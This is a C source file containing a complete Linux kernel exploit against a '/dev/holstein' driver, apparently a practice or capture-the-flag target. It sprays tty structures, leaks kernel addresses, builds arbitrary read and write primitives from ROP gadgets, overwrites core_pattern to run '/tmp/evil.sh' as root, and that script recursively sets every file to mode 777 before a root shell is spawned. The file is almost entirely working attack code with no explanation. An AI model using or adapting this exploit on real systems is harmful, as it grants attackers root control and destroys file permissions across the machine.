#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdlib.h>

unsigned long offset;
unsigned long g_buf;
char buf[0x1000];
int spray[100];
int fd;


unsigned long long user_cs, user_ss, user_rsp, user_rflags;


int aar32(unsigned long addr) {
  // 0xffffffff813a5f29: mov (%rdx), %rax; ret;
  unsigned long mov_drdx_rax = 0xffffffff813a5f29;
  
  *(unsigned long*)&buf[0x418] = g_buf;
  for (size_t i = 0; i < 0x200/8; ++i) {
    ((unsigned long*)buf)[i] = mov_drdx_rax;
  }
  write(fd, buf, 0x440);

  
  int leak = -1;
  for (size_t i = 0; i < 100; ++i) {
    int ret = ioctl(spray[i], 0xdead, addr);
    if (ret != -1) {
      leak = ret;
      break;
    }
  }
  return leak;
}

void aaw32(unsigned long addr, unsigned int val) {
  // 0xffffffff8101083d: mov %ecx, (%rdx); ret;
  unsigned long mov_ecx_drdx = 0xffffffff8101083d;
  *(unsigned long*)&buf[0x418] = g_buf;
  for (size_t i = 0; i < 0x200/8; ++i) {
    ((unsigned long*)buf)[i] = mov_ecx_drdx;
  }
  write(fd, buf, 0x440);

  for (size_t i = 0; i < 100; ++i) {
    ioctl(spray[i], val, addr);
  }
}

void save_state() {
  puts("[+] save_state");
  asm volatile(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void shell(void) {
  puts("[+] shell");
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  system("whoami");
  execve("/bin/sh", argv, envp);
}

int main() {
  save_state();
  for (int i = 0; i < 50; ++i) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1) {
      puts("[!] open error");
      return -1;
    }
  }

  fd = open("/dev/holstein", O_RDWR);
  if (fd == -1) {
    puts("[!] error opening holstein");
    return -2;
  }

  for (int i = 50; i < 100; ++i) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1) {
      puts("[!] open error");
      return -3;
    }
  }

  read(fd, buf, 0x440);
  unsigned long leak = *(unsigned long*)&buf[0x418];
  
  printf("[+] leak: %p\n", (void*)leak);
  offset = leak - 0xffffffff81c38880;
  printf("[+] offset: %lx\n", offset);

  g_buf = *(unsigned long*)&buf[0x438] - 0x438;
  printf("[+] gbuf: 0x%lx\n", g_buf);

  unsigned long core_pattern = 0xffffffff81eb0b20+offset;
  char s[] = "|/tmp/evil.sh";
  for (size_t i = 0; i < sizeof(s); i += 4) {
    aaw32(core_pattern+i, *(unsigned int*)(s+i));
  }

  system("echo -e '#!/bin/sh\nchmod -R 777 /' > /tmp/evil.sh");
  system("chmod +x /tmp/evil.sh");
  system("/segfault");
  shell();
  
  close(fd);
  return 0;
}
